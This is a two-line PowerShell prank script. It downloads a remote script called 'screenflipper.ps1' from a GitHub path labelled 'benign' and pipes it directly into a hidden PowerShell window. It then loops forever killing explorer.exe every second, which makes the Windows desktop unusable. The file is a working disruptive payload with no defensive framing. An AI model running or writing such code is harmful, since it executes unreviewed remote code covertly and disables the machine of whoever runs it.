start-job {powershell wget -usebasicparsing https://raw.githubusercontent.com/EPiC-Inc/My-Collection/master/benign/screenflipper.ps1 | select-object -expandproperty content | powershell -windowstyle hidden}
while ($true) {kill -name explorer; sleep -s 1}
